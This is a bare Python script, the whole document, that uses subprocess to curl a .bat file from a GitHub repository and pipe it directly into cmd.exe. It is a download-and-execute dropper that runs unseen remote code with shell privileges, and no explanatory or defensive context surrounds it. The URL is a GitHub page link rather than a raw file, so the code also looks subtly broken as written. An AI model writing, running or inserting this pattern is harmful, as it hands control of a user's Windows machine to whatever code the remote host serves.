import subprocess

url = "https://github.com/joythink77/abc/blob/main/1.bat"

subprocess.run(
    f'curl -s "{url}" | cmd.exe',
    shell=True
)
